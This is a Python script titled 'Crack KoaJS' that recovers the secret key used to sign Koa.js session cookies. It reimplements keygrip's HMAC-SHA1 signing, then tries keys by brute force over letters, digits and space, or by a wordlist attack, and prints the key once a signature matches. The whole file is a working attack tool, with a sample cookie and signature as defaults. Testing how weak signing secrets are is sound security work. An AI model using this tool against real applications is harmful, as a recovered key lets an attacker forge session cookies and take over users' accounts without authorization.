#!/usr/bin/env python
#-*- coding: utf-8 -*-
""" Crack KoaJS """

# Standard library imports
from argparse import ArgumentParser
from base64 import encodebytes
from hashlib import sha1
from hmac import new
from itertools import product

# Debug
# from pdb import set_trace as st

LOWER_A = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
UPPER_A = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
NUM = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
SPECIAL = [' ']

ALL = []
ALL = LOWER_A + UPPER_A + NUM + SPECIAL

VERSION = '%(prog)s 1.0.0'

# pylint: disable=anomalous-backslash-in-string, anomalous-backslash-in-string
def sign(cookie, key):
    """
    This function is rewrite in python from the function 'sign' of keygrip:
    function sign(data, key) {
        return crypto
            .createHmac(algorithm, key)
            .update(data).digest(encoding)
            .replace(/\/|\+|=/g, function(x) {
                return ({ "/": "_", "+": "-", "=": "" })[x]
        })
    }
    """
    digest_maker = new(key, cookie.encode(), sha1)
    digest_data = digest_maker.digest()
    encoded_data = encodebytes(digest_data).decode().split('\n')[0]
    sanitized_data = encoded_data.replace('/', '_').replace('+', '-').replace('=', '')
    return sanitized_data

def brute_force_attack(min_length, max_length, cookie, signature):
    """
    This is the main function, for brute-forcing
    """
    for sig_key_length in range(min_length, max_length+1):
        print("Length tried: {}".format(sig_key_length))
        for i_sig_key in product(ALL, repeat=sig_key_length):
            sig_key = ''.join(i_sig_key)
            if sign(cookie, sig_key.encode()) == signature:
                print('Found api-key: {}'.format(sig_key))
                exit(0)

def dictionnary_attack(dictionnary, cookie, signature):
    """
    This is the main function, for dictionnary attack
    """
    dico = open(dictionnary, 'r')
    for word in dico.readlines():
        if sign(cookie, word.split('\n')[0].encode()) == signature:
            print('Found api-key: {}'.format(word))
            exit(0)

if __name__ == '__main__':

    PARSER = ArgumentParser()
    PARSER.add_argument('--version', action='version', version=VERSION)
    PARSER.add_argument('-m', '--min', action='store',\
        help='minimal length.', default=0)
    PARSER.add_argument('-M', '--max', action='store',\
        help='maximal length.', default=1)
    PARSER.add_argument('-c', '--cookie', action='store',\
        help='cookie.', default='koa:sess=value')
    PARSER.add_argument('-s', '--signature', action='store',\
        help='signature.', default='CnOfshuN1VEbqzNU5FeqcSLQ1SI') # with KEY = 'abad'
    PARSER.add_argument('-d', '--dictionnary', action='store',\
        help='dictionnary, disable brute-force.')

    ARGS = PARSER.parse_args()

    if ARGS.dictionnary:
        dictionnary_attack(ARGS.dictionnary, ARGS.cookie, ARGS.signature)
    else:
        brute_force_attack(int(ARGS.min), int(ARGS.max), ARGS.cookie, ARGS.signature)

    exit(0)
